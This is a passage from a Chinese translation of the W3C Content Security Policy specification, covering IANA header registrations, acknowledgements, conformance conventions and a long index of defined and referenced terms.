                        <p>本文档（见 <a href="#directive-style-src">§ 6.1.13 style-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#style-src-attr"
                            id="ref-for-style-src-attr②"><code>style-src-attr</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-style-src-attr">§ 6.1.15 style-src-attr</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#style-src-elem"
                            id="ref-for-style-src-elem②"><code>style-src-elem</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-style-src-elem">§ 6.1.14 style-src-elem</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#worker-src"
                            id="ref-for-worker-src④"><code>worker-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-worker-src">§ 6.2.2 worker-src</a>）</p>
                </dl>
                <h3 class="heading settled" data-level="10.2" id="iana-headers"><span class="secno">10.2. </span><span
                        class="content">头部</span><a class="self-link" href="#iana-headers"></a></h3>
                <p>永久消息头字段注册表应根据以下内容进行更新：
                    <a data-link-type="biblio" href="#biblio-rfc3864" title="消息头字段的注册程序">[RFC3864]</a>
                </p>
                <h4 class="heading settled" data-level="10.2.1" id="iana-csp"><span class="secno">10.2.1. </span><span
                        class="content">Content-Security-Policy</span><a class="self-link" href="#iana-csp"></a></h4>
                <dl>
                    <dt>头字段名称
                    <dd>Content-Security-Policy
                    <dt>适用协议
                    <dd>http
                    <dt>状态
                    <dd>标准
                    <dt>作者/变更控制者
                    <dd>W3C
                    <dt>规范文件
                    <dd>本规范（见 <a href="#csp-header">§ 3.1 内容安全策略 HTTP 响应头字段</a>）
                </dl>
                <h4 class="heading settled" data-level="10.2.2" id="iana-cspro"><span class="secno">10.2.2. </span><span
                        class="content">Content-Security-Policy-Report-Only</span><a class="self-link"
                        href="#iana-cspro"></a></h4>
                <dl>
                    <dt>头字段名称
                    <dd>Content-Security-Policy-Report-Only
                    <dt>适用协议
                    <dd>http
                    <dt>状态
                    <dd>标准
                    <dt>作者/变更控制者
                    <dd>W3C
                    <dt>规范文件
                    <dd>本规范（见 <a href="#cspro-header">§ 3.2 内容安全策略-仅报告 HTTP 响应头字段</a>）
                </dl>
            </section>
            <section>
                <h2 class="heading settled" data-level="11" id="acknowledgements"><span class="secno">11. </span><span
                        class="content">致谢</span><a class="self-link" href="#acknowledgements"></a></h2>
                <p>有很多人值得称赞。例如：</p>
                <ul>
                    <li data-md>
                        <p>Mario 和 Cure53 的所有成员。</p>
                    <li data-md>
                        <p>Artur Janc、Michele Spagnuolo、Lukas Weichselbaum、Jochen Eisinger 以及 Google 的 CSP 小组的其他成员。</p>
                </ul>
            </section>
        </section>
    </main>
    <div data-fill-with="conformance">
        <h2 class="no-ref no-num heading settled" id="w3c-conformance"><span class="content">一致性</span><a
                class="self-link" href="#w3c-conformance"></a></h2>
        <h3 class="no-ref no-num heading settled" id="w3c-conventions"><span class="content">文档约定</span><a
                class="self-link" href="#w3c-conventions"></a></h3>
        <p>一致性要求通过描述性断言和 RFC 2119 术语的组合来表达。
            在本文件的规范部分中，
            关键词“必须 (MUST)”、“不得 (MUST NOT)”、“必需 (REQUIRED)”、“应 (SHALL)”、“不应 (SHALL NOT)”、“应该 (SHOULD)”、“不应该 (SHOULD
            NOT)”、“推荐 (RECOMMENDED)”、“可以 (MAY)”和“可选 (OPTIONAL)”
            应按照 RFC 2119 中的描述进行解释。
            但是，为了可读性，
            这些词汇在本规范中并不全部以大写字母出现。
        </p>
        <p>除明确标记为非规范的章节、示例和注释外，
            本规范的所有内容均为规范性内容。<a data-link-type="biblio" href="#biblio-rfc2119" title="用于指示要求级别的关键字">[RFC2119]</a>
        </p>
        <p>本规范中的示例以“例如”开头，
            或使用 <code>class="example"</code> 设置与规范性文本分开，
            如下所示：</p>
        <div class="example" id="w3c-example">
            <a class="self-link" href="#w3c-example"></a>
            <p>这是一个说明性示例。</p>
        </div>
        <p>说明性注释以“注意”开头，
            并使用 <code>class="note"</code> 设置与规范性文本分开，
            如下所示：</p>
        <p class="note" role="note">注意，这是一个说明性注释。</p>
        <section>
            <h3 class="no-ref no-num heading settled" id="w3c-conformant-algorithms"><span
                    class="content">符合规范的算法</span><a class="self-link" href="#w3c-conformant-algorithms"></a></h3>
            <p>在算法部分以命令式表达的要求（例如“去除所有前导空格字符”或“返回 false 并中止这些步骤”）应按照引入算法时使用的关键字（例如“必须 (must)”、“应该 (should)”、“可以
                (may)”等）的含义来理解。</p>
            <p>作为算法或特定步骤表达的一致性要求可以以任何方式实现，只要最终结果是等效的即可。
                特别地，本规范中定义的算法旨在易于理解，并不打算具备高效性能。
                鼓励实现者进行优化。</p>
        </section>
    </div>
    <script src="https://www.w3.org/scripts/TR/2021/fixup.js"></script>
    <h2 class="no-num no-ref heading settled" id="index"><span class="content">索引</span><a class="self-link"
            href="#index"></a></h2>
    <h3 class="no-num no-ref heading settled" id="index-defined-here"><span class="content">本规范定义的术语</span><a
            class="self-link" href="#index-defined-here"></a></h3>
    <ul class="index">
        <li><a href="#grammardef-allow">'allow'</a><span>，在 § 6.2.1</span>
        <li><a href="#source-list-allows-all-inline-behavior">允许所有内联行为</a><span>，在 § 6.7.3.2</span>
        <li><a href="#source-list-allows-all-inline-behavior">允许所有内联行为</a><span>，在 § 6.7.3.2</span>
        <li><a href="#grammardef-ancestor-source">ancestor-source</a><span>，在 § 6.4.2</span>
        <li><a href="#grammardef-ancestor-source-list">ancestor-source-list</a><span>，在 § 6.4.2</span>
        <li><a href="#grammardef-base64-value">base64-value</a><span>，在 § 2.3.1</span>
        <li><a href="#base-uri">base-uri</a><span>，在 § 6.3.1</span>
        <li><a href="#grammardef-block">'block'</a><span>，在 § 6.2.1</span>
        <li>blockedURI
            <ul>
                <li><a href="#dom-securitypolicyviolationevent-blockeduri">SecurityPolicyViolationEvent 的属性</a><span>，在
                        § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-blockeduri">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#dom-cspviolationreportbody-blockedurl">blockedURL</a><span>，在 § 5</span>
        <li><a href="#child-src">child-src</a><span>，在 § 6.1.1</span>
        <li><a href="#violation-column-number">列号</a><span>，在 § 2.4</span>
        <li>columnNumber
            <ul>
                <li><a href="#dom-cspviolationreportbody-columnnumber">CSPViolationReportBody 的属性</a><span>，在 § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-columnnumber">SecurityPolicyViolationEvent
                        的属性</a><span>，在 § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-columnnumber">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#connect-src">connect-src</a><span>，在 § 6.1.2</span>
        <li><a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent">构造函数(type)</a><span>，在 § 5.1</span>
        <li><a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent">构造函数(type,
                eventInitDict)</a><span>，在 § 5.1</span>
        <li><a href="#contains-a-header-delivered-content-security-policy">包含头部传递的内容安全策略</a><span>，在 § 2.2</span>
        <li><a href="#content-security-policy">内容安全策略</a><span>，在 § 1</span>
        <li><a href="#header-content-security-policy">Content-Security-Policy</a><span>，在 § 3.1</span>
        <li><a href="#content-security-policy-object">内容安全策略对象</a><span>，在 § 2.2</span>
        <li><a href="#header-content-security-policy-report-only">Content-Security-Policy-Report-Only</a><span>，在
                § 3.2</span>
        <li>CSP 列表
            <ul>
                <li><a href="#csp-list">定义</a><span>，在 § 2.2</span>
                <li><a href="#global-object-csp-list">全局对象的定义</a><span>，在 § 4.2</span>
            </ul>
        <li><a href="#csp-violation-report">CSP 违规报告</a><span>，在 § 5</span>
        <li><a href="#cspviolationreportbody">CSPViolationReportBody</a><span>，在 § 5</span>
        <li><a href="#default-src">default-src</a><span>，在 § 6.1.3</span>
        <li><a href="#grammardef-directive-name">指令名称</a><span>，在 § 2.3</span>
        <li><a href="#directives">指令</a><span>，在 § 2.3</span>
        <li><a href="#policy-directive-set">指令集</a><span>，在 § 2.2</span>
        <li><a href="#grammardef-directive-value">指令值</a><span>，在 § 2.3</span>
        <li>处置
            <ul>
                <li><a href="#dom-cspviolationreportbody-disposition">CSPViolationReportBody 的属性</a><span>，在 § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-disposition">SecurityPolicyViolationEvent 的属性</a><span>，在
                        § 5.1</span>
                <li><a href="#policy-disposition">政策的定义</a><span>，在 § 2.2</span>
                <li><a href="#violation-disposition">违规的定义</a><span>，在 § 2.4</span>
                <li><a href="#dom-securitypolicyviolationeventinit-disposition">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li>documentURI
            <ul>
                <li><a href="#dom-securitypolicyviolationevent-documenturi">SecurityPolicyViolationEvent 的属性</a><span>，在
                        § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-documenturi">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#dom-cspviolationreportbody-documenturl">documentURL</a><span>，在 § 5</span>
        <li><a href="#match-url-to-source-expression">URL 是否与源表达式匹配并重定向计数？</a><span>，在 § 6.7.2.7</span>
        <li>有效指令
            <ul>
                <li><a href="#request-effective-directive">请求的定义</a><span>，在 § 6.8.1</span>
                <li><a href="#violation-effective-directive">违规的定义</a><span>，在 § 2.4</span>
            </ul>
        <li>
            effectiveDirective
            <ul>
                <li><a href="#dom-cspviolationreportbody-effectivedirective">CSPViolationReportBody 的属性</a><span>，在
                        § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-effectivedirective">SecurityPolicyViolationEvent
                        的属性</a><span>，在 § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-effectivedirective">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#violation-element">元素</a><span>，在 § 2.4</span>
        <li><a href="#dom-securitypolicyviolationeventdisposition-enforce">"enforce"</a><span>，在 § 5.1</span>
        <li><a href="#enforced">已执行</a><span>，在 § 4.2</span>
        <li><a href="#can-compile-strings">EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString,
                codeString, compilationType, parameterArgs, bodyArg)</a><span>，在 § 4.4</span>
        <li><a href="#can-compile-wasm-bytes">EnsureCSPDoesNotBlockWasmByteCompilationrealm</a><span>，在 § 4.5</span>
        <li><a href="#fetch-directives">获取指令</a><span>，在 § 6.1</span>
        <li><a href="#font-src">font-src</a><span>，在 § 6.1.4</span>
        <li><a href="#form-action">form-action</a><span>，在 § 6.4.1</span>
        <li><a href="#frame-ancestors">frame-ancestors</a><span>，在 § 6.4.2</span>
        <li><a href="#frame-src">frame-src</a><span>，在 § 6.1.5</span>
        <li><a href="#violation-global-object">全局对象</a><span>，在 § 2.4</span>
        <li><a href="#grammardef-hash-algorithm">哈希算法</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-hash-source">哈希源</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-host-char">主机字符</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-host-part">主机部分</a><span>，在 § 2.3.1</span>
        <li><a href="#host-part-match">主机部分匹配</a><span>，在 § 6.7.2.10</span>
        <li><a href="#grammardef-host-source">主机源</a><span>，在 § 2.3.1</span>
        <li><a href="#img-src">img-src</a><span>，在 § 6.1.6</span>
        <li><a href="#directive-initialization">初始化指令</a><span>，在 § 2.3</span>
        <li><a href="#directive-inline-check">内联检查</a><span>，在 § 2.3</span>
        <li><a href="#allow-base-for-document">文档是否允许 base?</a><span>，在 § 6.3.1</span>
        <li><a href="#grammardef-keyword-source">关键词源</a><span>，在 § 2.3.1</span>
        <li><a href="#violation-line-number">行号</a><span>，在 § 2.4</span>
        <li>lineNumber
            <ul>
                <li><a href="#dom-cspviolationreportbody-linenumber">CSPViolationReportBody 的属性</a><span>，在 § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-linenumber">SecurityPolicyViolationEvent 的属性</a><span>，在
                        § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-linenumber">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#manifest-src">manifest-src</a><span>，在 § 6.1.7</span>
        <li><a href="#media-src">media-src</a><span>，在 § 6.1.8</span>
        <li><a href="#monitored">受监控的</a><span>，在 § 4.2</span>
        <li><a href="#directive-name">名称</a><span>，在 § 2.3</span>
        <li><a href="#directive-navigation-response-check">导航响应检查</a><span>，在 § 2.3</span>
        <li><a href="#grammardef-nonce-source">nonce 源</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-none">'none'</a><span>，在 § 2.3.1</span>
        <li><a href="#object-src">object-src</a><span>，在 § 6.1.9</span>
        <li><a href="#grammardef-optional-ascii-whitespace">可选的 ASCII 空格</a><span>，在 § 2.1</span>
        <li>originalPolicy
            <ul>
                <li><a href="#dom-cspviolationreportbody-originalpolicy">CSPViolationReportBody 的属性</a><span>，在
                        § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-originalpolicy">SecurityPolicyViolationEvent
                        的属性</a><span>，在 § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-originalpolicy">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#abstract-opdef-parse-a-responses-content-security-policies">解析响应的内容安全策略</a><span>，在 § 2.2.2</span>
        <li><a href="#abstract-opdef-parse-a-serialized-csp">解析序列化的 CSP</a><span>，在 § 2.2.1</span>
        <li><a href="#parse-response-csp">解析响应的内容安全策略</a><span>，在 § 2.2.1</span>
        <li><a href="#grammardef-path-part">路径部分</a><span>，在 § 2.3.1</span>
        <li><a href="#path-part-match">路径部分匹配</a><span>，在 § 6.7.2.12</span>
        <li>policy
            <ul>
                <li><a href="#content-security-policy-object">定义</a><span>，在 § 2.2</span>
                <li><a href="#violation-policy">违规的定义</a><span>，在 § 2.4</span>
            </ul>
        <li><a href="#grammardef-port-part">端口部分</a><span>，在 § 2.3.1</span>
        <li><a href="#port-part-matches">端口部分匹配</a><span>，在 § 6.7.2.11</span>
        <li><a href="#directive-post-request-check">请求后的检查</a><span>，在 § 2.3</span>
        <li><a href="#directive-pre-navigation-check">导航前检查</a><span>，在 § 2.3</span>
        <li><a href="#directive-pre-request-check">请求前检查</a><span>，在 § 2.3</span>
        <li>referrer
            <ul>
                <li><a href="#dom-cspviolationreportbody-referrer">CSPViolationReportBody 的属性</a><span>，在 § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-referrer">SecurityPolicyViolationEvent 的属性</a><span>，在
                        § 5.1</span>
                <li><a href="#violation-referrer">违规的定义</a><span>，在 § 2.4</span>
                <li><a href="#dom-securitypolicyviolationeventinit-referrer">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#dom-securitypolicyviolationeventdisposition-report">"report"</a><span>，在 § 5.1</span>
        <li><a href="#report-for-request">报告请求的内容安全策略违规</a><span>，在 § 4.1</span>
        <li><a href="#grammardef-report-sample">'report-sample'</a><span>，在 § 2.3.1</span>
        <li><a href="#report-to">report-to</a><span>，在 § 6.5.2</span>
        <li><a href="#report-uri">report-uri</a><span>，在 § 6.5.1</span>
        <li><a href="#grammardef-required-ascii-whitespace">必需的 ASCII 空格</a><span>，在 § 2.1</span>
        <li><a href="#violation-resource">资源</a><span>，在 § 2.4</span>
        <li><a href="#run-document-csp-initialization">为文档运行 CSP 初始化</a><span>，在 § 4.2</span>
        <li><a href="#run-global-object-csp-initialization">为全局对象运行 CSP 初始化</a><span>，在 § 4.2.5</span>
        <li>sample
            <ul>
                <li><a href="#dom-cspviolationreportbody-sample">CSPViolationReportBody 的属性</a><span>，在 § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-sample">SecurityPolicyViolationEvent 的属性</a><span>，在
                        § 5.1</span>
                <li><a href="#violation-sample">违规的定义</a><span>，在 § 2.4</span>
                <li><a href="#dom-securitypolicyviolationeventinit-sample">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#sandbox">sandbox</a><span>，在 § 6.3.2</span>
        <li><a href="#grammardef-scheme-part">scheme-part</a><span>，在 § 2.3.1</span>
        <li><a href="#scheme-part-match">scheme-part 匹配</a><span>，在 § 6.7.2.9</span>
        <li><a href="#grammardef-scheme-source">scheme-source</a><span>，在 § 2.3.1</span>
        <li><a href="#script-src">script-src</a><span>，在 § 6.1.10</span>
        <li><a href="#script-src-attr">script-src-attr</a><span>，在 § 6.1.12</span>
        <li><a href="#script-src-elem">script-src-elem</a><span>，在 § 6.1.11</span>
        <li><a href="#eventdef-globaleventhandlers-securitypolicyviolation">securitypolicyviolation</a><span>，在
                § 5.5</span>
        <li><a href="#securitypolicyviolationevent">SecurityPolicyViolationEvent</a><span>，在 § 5.1</span>
        <li><a href="#enumdef-securitypolicyviolationeventdisposition">SecurityPolicyViolationEventDisposition</a><span>，在
                § 5.1</span>
        <li><a href="#dictdef-securitypolicyviolationeventinit">SecurityPolicyViolationEventInit</a><span>，在
                § 5.1</span>
        <li><a
                href="#dom-securitypolicyviolationevent-securitypolicyviolationevent">SecurityPolicyViolationEvent(type)</a><span>，在
                § 5.1</span>
        <li><a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent">SecurityPolicyViolationEvent(type,
                eventInitDict)</a><span>，在 § 5.1</span>
        <li><a href="#grammardef-self">'self'</a><span>，在 § 2.3.1</span>
        <li><a href="#policy-self-origin">self-origin</a><span>，在 § 2.2</span>
        <li><a href="#serialized-csp">序列化的 CSP</a><span>，在 § 2.2</span>
        <li><a href="#serialized-csp-list">序列化的 CSP 列表</a><span>，在 § 2.2</span>
        <li><a href="#serialized-directive">序列化的指令</a><span>，在 § 2.3</span>
        <li><a href="#grammardef-serialized-directive">序列化指令</a><span>，在 § 2.3</span>
        <li><a href="#grammardef-serialized-policy">序列化的策略</a><span>，在 § 2.2</span>
        <li><a href="#grammardef-serialized-policy-list">序列化的策略列表</a><span>，在 § 2.2</span>
        <li><a href="#serialized-source-list">序列化的源列表</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-serialized-source-list">序列化源列表</a><span>，在 § 2.3.1</span>
        <li><a href="#should-block-inline">元素的内联类型行为是否应被内容安全策略阻止？</a><span>，在 § 4.2.2</span>
        <li><a href="#should-block-navigation-request">是否应阻止类型为内容安全策略的导航请求？</a><span>，在 § 4.2.3</span>
        <li><a href="#should-block-navigation-response">是否应阻止目标类型的导航请求的导航响应？</a><span>，在 § 4.2.4</span>
        <li><a href="#should-block-request">是否应由内容安全策略阻止请求？</a><span>，在 § 4.1.1</span>
        <li><a href="#should-block-response">是否应由内容安全策略阻止对请求的响应？</a><span>，在 § 4.1.2</span>
        <li><a href="#policy-source">源</a><span>，在 § 2.2</span>
        <li><a href="#source-expression">源表达式</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-source-expression">源表达式</a><span>，在 § 2.3.1</span>
        <li><a href="#violation-source-file">源文件</a><span>，在 § 2.4</span>
        <li>sourceFile
            <ul>
                <li><a href="#dom-cspviolationreportbody-sourcefile">CSPViolationReportBody 的属性</a><span>，在 § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-sourcefile">SecurityPolicyViolationEvent 的属性</a><span>，在
                        § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-sourcefile">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#source-lists">源列表</a><span>，在 § 2.3.1</span>
        <li><a href="#violation-status">状态</a><span>，在 § 2.4</span>
        <li>statusCode
            <ul>
                <li><a href="#dom-cspviolationreportbody-statuscode">CSPViolationReportBody 的属性</a><span>，在 § 5</span>
                <li><a href="#dom-securitypolicyviolationevent-statuscode">SecurityPolicyViolationEvent 的属性</a><span>，在
                        § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-statuscode">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#grammardef-strict-dynamic">'strict-dynamic'</a><span>，在 § 2.3.1</span>
        <li><a href="#style-src">style-src</a><span>，在 § 6.1.13</span>
        <li><a href="#style-src-attr">style-src-attr</a><span>，在 § 6.1.15</span>
        <li><a href="#style-src-elem">style-src-elem</a><span>，在 § 6.1.14</span>
        <li><a href="#dom-cspviolationreportbody-tojson">toJSON()</a><span>，在 § 5</span>
        <li><a href="#grammardef-unsafe-allow-redirects">'unsafe-allow-redirects'</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-unsafe-eval">'unsafe-eval'</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-unsafe-hashes">'unsafe-hashes'</a><span>，在 § 2.3.1</span>
        <li><a href="#grammardef-unsafe-inline">'unsafe-inline'</a><span>，在 § 2.3.1</span>
        <li><a href="#violation-url">URL</a><span>，在 § 2.4</span>
        <li><a href="#directive-value">值</a><span>，在 § 2.3</span>
        <li>violatedDirective
            <ul>
                <li><a href="#dom-securitypolicyviolationevent-violateddirective">SecurityPolicyViolationEvent
                        的属性</a><span>，在 § 5.1</span>
                <li><a href="#dom-securitypolicyviolationeventinit-violateddirective">SecurityPolicyViolationEventInit
                        的成员</a><span>，在 § 5.1</span>
            </ul>
        <li><a href="#violation">违规</a><span>，在 § 2.4</span>
        <li><a href="#grammardef-wasm-unsafe-eval">'wasm-unsafe-eval'</a><span>，在 § 2.3.1</span>
        <li><a href="#webrtc">webrtc</a><span>，在 § 6.2.1</span>
        <li><a href="#directive-webrtc-pre-connect-check">webrtc 预连接检查</a><span>，在 § 2.3</span>
        <li><a href="#worker-src">worker-src</a><span>，在 § 6.2.2</span>
    </ul>
    <h3 class="no-num no-ref heading settled" id="index-defined-elsewhere"><span class="content">通过引用定义的术语</span><a
            class="self-link" href="#index-defined-elsewhere"></a></h3>
    <ul class="index">
        <li>
            <a data-link-type="biblio">[CSP3]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="6d126909">解析序列化的 CSP 列表</span>
            </ul>
        <li>
            <a data-link-type="biblio">[CSS-CASCADE-5]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="3eef835e">@import</span>
            </ul>
        <li>
            <a data-link-type="biblio">[CSSOM]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="4ffecae2">插入 CSS 规则</span>
                <li><span class="dfn-paneled" id="e49ee8ab">解析 CSS 声明块</span>
                <li><span class="dfn-paneled" id="30cbbf14">解析 CSS 规则</span>
                <li><span class="dfn-paneled" id="4f06d0ed">解析选择器组</span>
            </ul>
        <li>
            <a data-link-type="biblio">[DOM]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="85394472">Document</span>
                <li><span class="dfn-paneled" id="296f3551">Element</span>
                <li><span class="dfn-paneled" id="129bdae8">Event</span>
                <li><span class="dfn-paneled" id="44a7708c">EventInit</span>
                <li><span class="dfn-paneled" id="2bc0cdf4">EventTarget</span>
                <li><span class="dfn-paneled" id="77211728">属性列表</span>
                <li><span class="dfn-paneled" id="0c0ceb78">冒泡</span>
                <li><span class="dfn-paneled" id="8b547cc7">组合</span>
                <li><span class="dfn-paneled" id="9638f92b">连接</span>
                <li><span class="dfn-paneled" id="5fd23811">触发事件</span>
                <li><span class="dfn-paneled" id="c62cd7cf">origin</span>
                <li><span class="dfn-paneled" id="ea2049db">包含影子根</span>
                <li><span class="dfn-paneled" id="e8478f36">target</span>
            </ul>
        <li>
            <a data-link-type="biblio">[ECMA262]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="7414e9fd">Function()</span>
                <li><span class="dfn-paneled" id="78dac792">HostEnsureCanCompileStrings()</span>
                <li><span class="dfn-paneled" id="bccca632">eval()</span>
                <li><span class="dfn-paneled" id="656bb36c">realm</span>
            </ul>
        <li>
            <a data-link-type="biblio">[ENCODING]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="0303e8e5">utf-8 编码</span>
            </ul>
        <li>
            <a data-link-type="biblio">[FETCH]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="8e9945a0">body</span>
                <li><span class="dfn-paneled" id="857d5516">client</span>
                <li><span class="dfn-paneled" id="902380f7">凭证模式</span>
                <li><span class="dfn-paneled" id="784f01de">加密随机数元数据</span>
                <li><span class="dfn-paneled" id="3f2ca4de">当前 URL</span>
                <li><span class="dfn-paneled" id="3ae34c95">目的地</span>
                <li><span class="dfn-paneled" id="3be1d4ac">提取头列表值</span>
                <li><span class="dfn-paneled" id="a33db89a">fetch</span>
                <li><span class="dfn-paneled" id="6ee0eab1">头列表 <small>(用于请求)</small></span>
                <li><span class="dfn-paneled" id="f7b00a8b">头列表 <small>(用于响应)</small></span>
                <li><span class="dfn-paneled" id="eb62573b">http(s) 方案</span>
                <li><span class="dfn-paneled" id="fa4ea124">发起者</span>
                <li><span class="dfn-paneled" id="d79a826f">完整性元数据</span>
                <li><span class="dfn-paneled" id="8f26de31">是否本地</span>
                <li><span class="dfn-paneled" id="8394d1b7">保持活跃</span>
                <li><span class="dfn-paneled" id="63340982">本地方案</span>
                <li><span class="dfn-paneled" id="e0dfd35e">主 fetch</span>
                <li><span class="dfn-paneled" id="50b05fad">method</span>
                <li><span class="dfn-paneled" id="cb98f71f">模式</span>
                <li><span class="dfn-paneled" id="eb1b1af3">网络错误</span>
                <li><span class="dfn-paneled" id="f78d5b5c">origin</span>
                <li><span class="dfn-paneled" id="ee1a333c">解析器元数据</span>
                <li><span class="dfn-paneled" id="86efadaf">策略容器</span>
                <li><span class="dfn-paneled" id="8c3deeef">重定向计数</span>
                <li><span class="dfn-paneled" id="64b62ea0">重定向模式</span>
                <li><span class="dfn-paneled" id="55213b5b">请求</span>
                <li><span class="dfn-paneled" id="ee7bba09">响应</span>
                <li><span class="dfn-paneled" id="d8fc72f5">类似脚本的</span>
                <li><span class="dfn-paneled" id="dc1cd39b">URL <small>(用于请求)</small></span>
                <li><span class="dfn-paneled" id="3268a8eb">URL <small>(用于响应)</small></span>
                <li><span class="dfn-paneled" id="1ab127d6">window</span>
            </ul>
        <li>
            <a data-link-type="biblio">[HTML]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="9d459c32">"parser-inserted"</span>
                <li><span class="dfn-paneled" id="a13a702f">SharedWorker</span>
                <li><span class="dfn-paneled" id="5d7209e9">Window</span>
                <li><span class="dfn-paneled" id="bfc1c271">Worker</span>
                <li><span class="dfn-paneled" id="83c59a3a">WorkerGlobalScope</span>
                <li><span class="dfn-paneled" id="0c9b0d3c">WorkletGlobalScope</span>
                <li><span class="dfn-paneled" id="68bf3d31">a</span>
                <li><span class="dfn-paneled" id="27e10eaf">活动沙盒标志集</span>
                <li><span class="dfn-paneled" id="e9c183b8">iframe srcdoc 文档</span>
                <li><span class="dfn-paneled" id="b410a6ef">原点的 ASCII 序列化</span>
                <li><span class="dfn-paneled" id="3349d69f">关联的文档</span>
                <li><span class="dfn-paneled" id="1565d481">尝试填充历史记录条目的文档</span>
                <li><span class="dfn-paneled" id="c847111b">base</span>
                <li><span class="dfn-paneled" id="f23dc013">子可导航对象</span>
                <li><span class="dfn-paneled" id="cc601639">容器文档</span>
                <li><span class="dfn-paneled" id="5a88c1c3">内容</span>
                <li><span class="dfn-paneled" id="92812d1b">内容安全策略状态</span>
                <li><span class="dfn-paneled" id="8c209bab">创建并初始化新文档对象</span>
                <li><span class="dfn-paneled" id="07ad3048">通过抓取创建导航参数</span>
                <li><span class="dfn-paneled" id="158b3a38">csp 列表</span>
                <li><span class="dfn-paneled" id="27e00acc">csp 派生的沙盒标志</span>
                <li><span class="dfn-paneled" id="12b8dfc0">当前设置对象</span>
                <li><span class="dfn-paneled" id="4468342f">数据</span>
                <li><span class="dfn-paneled" id="04e0443f">document</span>
                <li><span class="dfn-paneled" id="e0e0bca6">重复属性</span>
                <li><span class="dfn-paneled" id="49a6cb20">embed</span>
                <li><span class="dfn-paneled" id="3e12e042">环境设置对象</span>
                <li><span class="dfn-paneled" id="88ed8860">frame</span>
                <li><span class="dfn-paneled" id="4b6086d7">全局对象</span>
                <li><span class="dfn-paneled" id="8a30477b">全局对象 <small>(用于环境设置对象)</small></span>
                <li><span class="dfn-paneled" id="168f1b6e">全局对象 <small>(用于 realm)</small></span>
                <li><span class="dfn-paneled" id="56c6bafc">href</span>
                <li><span class="dfn-paneled" id="448c95f9">http-equiv</span>
                <li><span class="dfn-paneled" id="87fcd40c">iframe</span>
                <li><span class="dfn-paneled" id="6cfa013d">link</span>
                <li><span class="dfn-paneled" id="64b89595">meta</span>
                <li><span class="dfn-paneled" id="5ab373ec">可导航对象</span>
                <li><span class="dfn-paneled" id="13dd6cae">节点可导航对象</span>
                <li><span class="dfn-paneled" id="b1e9fc19">nonce</span>
                <li><span class="dfn-paneled" id="99b5cef6">object</span>
                <li><span class="dfn-paneled" id="b01b1359">不透明原点</span>
                <li><span class="dfn-paneled" id="b4f2d668">origin</span>
                <li><span class="dfn-paneled" id="43ac8374">origin <small>(用于环境设置对象)</small></span>
                <li><span class="dfn-paneled" id="53f0ea4e">解析沙盒指令</span>
                <li><span class="dfn-paneled" id="9f53ade1">解析错误</span>
                <li><span class="dfn-paneled" id="3da24a47">ping</span>
                <li><span class="dfn-paneled" id="48958f5d">plugin</span>
                <li><span class="dfn-paneled" id="b33787b2">策略容器</span>
                <li><span class="dfn-paneled" id="08639fbc">策略容器 <small>(用于 Document)</small></span>
                <li><span class="dfn-paneled" id="bd1db03d">策略容器 <small>(用于环境设置对象)</small></span>
                <li><span class="dfn-paneled" id="cc0cac2e">preconnect</span>
